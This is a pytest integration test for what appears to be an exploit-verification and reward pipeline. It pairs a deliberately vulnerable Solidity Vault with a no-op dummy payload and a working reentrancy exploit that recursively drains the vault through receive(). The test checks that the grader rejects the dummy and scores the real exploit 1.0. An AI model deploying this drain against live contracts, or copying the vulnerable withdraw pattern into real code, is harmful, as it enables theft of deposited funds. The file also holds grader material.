import os
import shutil
import sys
import pytest

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.schemas import TargetProgram, AttackHypothesis, ExploitPayload
from core.evaluator import evaluate_execution_trace
from sandbox.runner import run_payload_in_sandbox


VAULT_TARGET = TargetProgram(
    name="Vault",
    source_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Vault {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;
    address public owner;

    constructor() { owner = msg.sender; }

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be positive");
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdrawAll() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
        totalDeposits -= balance;
    }

    function getVaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
""",
    language="solidity",
    invariants=["vaultRemainingBalance >= balances[victim] (Depositor Solvency)"]
)

DUMMY_PAYLOAD = ExploitPayload(
    target_name="Vault",
    hypothesis=AttackHypothesis(
        vulnerability_type="None",
        reasoning_trace="Testing dummy bypass rejection",
        attack_vector="No-op module"
    ),
    test_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ExploitModule {
    constructor(address) {}
    function runExploit() external payable {}
}
"""
)

REAL_REENTRANCY_PAYLOAD = ExploitPayload(
    target_name="Vault",
    hypothesis=AttackHypothesis(
        vulnerability_type="ReentrancyDrain",
        reasoning_trace="State update after external call in withdrawAll()",
        attack_vector="Recursive drain via receive() callback"
    ),
    test_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "../src/Vault.sol";

contract ExploitModule {
    Vault public vault;

    constructor(address _target) {
        vault = Vault(_target);
    }

    function runExploit() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdrawAll();
        }
    }
}
"""
)


def test_real_foundry_execution_rejects_dummy_and_accepts_reentrancy():
    """
    CI Integration Test:
    Physically executes Foundry (`forge test --offline --json -vvvv`) against
    the immutable `VaultTrustedHarness` in the EVM.

    Verifies:
    1. Dummy ExploitModule without attack logic MUST REVERT with 'EXPLOIT_FAILED'.
    2. Real Reentrancy ExploitModule MUST SUCCEED with [INVARIANT_BREACHED:DEPOSITOR_SOLVENCY_COLLAPSE].
    """
    has_local_forge = shutil.which("forge") is not None
    run_on_modal = os.environ.get("MODAL_INTEGRATION_TEST") == "1"

    if not has_local_forge and not run_on_modal:
        pytest.skip(
            "Local 'forge' binary not found. This integration test executes in Linux CI "
            "with Foundry installed, or via Modal with MODAL_INTEGRATION_TEST=1."
        )

    if has_local_forge:
        # 1. Run Dummy Candidate through local Forge
        res_dummy = run_payload_in_sandbox(VAULT_TARGET, DUMMY_PAYLOAD)
        verdict_dummy = evaluate_execution_trace(DUMMY_PAYLOAD, res_dummy)

        assert res_dummy.invariant_violated is False, "Dummy module must NOT be marked invariant_violated!"
        assert res_dummy.return_code != 0, "Dummy module execution must fail/revert in trusted harness!"
        assert verdict_dummy.is_verified is False, "Dummy exploit must be rejected by evaluator!"
        assert "Vault remains solvent" in (res_dummy.revert_reason or res_dummy.stderr or res_dummy.stdout)

        # 2. Run Real Reentrancy Candidate through local Forge
        res_real = run_payload_in_sandbox(VAULT_TARGET, REAL_REENTRANCY_PAYLOAD)
        verdict_real = evaluate_execution_trace(REAL_REENTRANCY_PAYLOAD, res_real)

        assert res_real.invariant_violated is True, "Real reentrancy must breach the solvency invariant!"
        assert res_real.return_code == 0, "Real reentrancy test must exit with code 0 on verified breach!"
        assert verdict_real.is_verified is True, "Real exploit must be awarded verified status (+1.00)!"
        assert verdict_real.reward_score == 1.0
        assert any("[INVARIANT_BREACHED:DEPOSITOR_SOLVENCY_COLLAPSE]" in str(l) for l in res_real.decoded_logs)

    elif run_on_modal:
        from modal_app import app, verify_exploit_remote
        with app.run():
            res_dummy = verify_exploit_remote.remote(VAULT_TARGET.model_dump(), DUMMY_PAYLOAD.model_dump())
            assert res_dummy["is_verified"] is False

            res_real = verify_exploit_remote.remote(VAULT_TARGET.model_dump(), REAL_REENTRANCY_PAYLOAD.model_dump())
            assert res_real["is_verified"] is True
            assert res_real["reward_score"] == 1.0
